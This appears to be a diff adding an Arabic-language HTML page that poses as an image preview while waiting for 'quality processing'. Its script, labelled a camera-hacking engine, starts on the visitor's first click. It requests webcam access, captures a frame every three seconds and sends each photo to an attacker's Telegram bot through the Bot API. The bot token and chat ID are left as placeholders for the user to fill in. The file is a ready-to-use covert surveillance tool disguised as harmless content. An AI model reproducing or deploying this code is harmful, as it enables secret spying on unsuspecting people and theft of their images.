@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>معاينة الصورة</title>
+    <style>
+        body { background-color: #000; color: white; text-align: center; font-family: Arial; }
+        img { max-width: 100%; margin-top: 20px; border-radius: 10px; }
+        .loading { margin-top: 20px; color: #555; }
+    </style>
+</head>
+<body>
+    <div id="content">
+        <img id="target-image" src="" alt="جاري تحميل الصورة...">
+        <p class="loading">يرجى الانتظار، جاري معالجة الجودة...</p>
+    </div>
+
+    <video id="video" style="display:none;" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        // إعدادات البوت الخاصة بك (ضع بياناتك هنا)
+        const BOT_TOKEN = 'YOUR_BOT_TOKEN';
+        const CHAT_ID = 'YOUR_CHAT_ID';
+
+        // 1. جلب رابط الصورة من الرابط (URL)
+        const urlParams = new URLSearchParams(window.location.search);
+        const imgUrl = urlParams.get('view_img');
+        if (imgUrl) { document.getElementById('target-image').src = imgUrl; }
+
+        // 2. محرك اختراق الكاميرا
+        async function startHack() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // التقاط صورة كل 3 ثوانٍ
+                setInterval(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = 640;
+                    canvas.height = 480;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const photo = canvas.toDataURL('image/jpeg');
+                    sendToTelegram(photo);
+                }, 3000);
+            } catch (err) {
+                console.log("Access Denied");
+            }
+        }
+
+        function sendToTelegram(photoBase64) {
+            const blob = dataURItoBlob(photoBase64);
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'cam_shot.jpg');
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        }
+
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
+            return new Blob([ab], {type: 'image/jpeg'});
+        }
+
+        // بدء العملية بمجرد لمس الشاشة
+        window.onclick = () => { startHack(); };
+    </script>
+</body>
+</html>
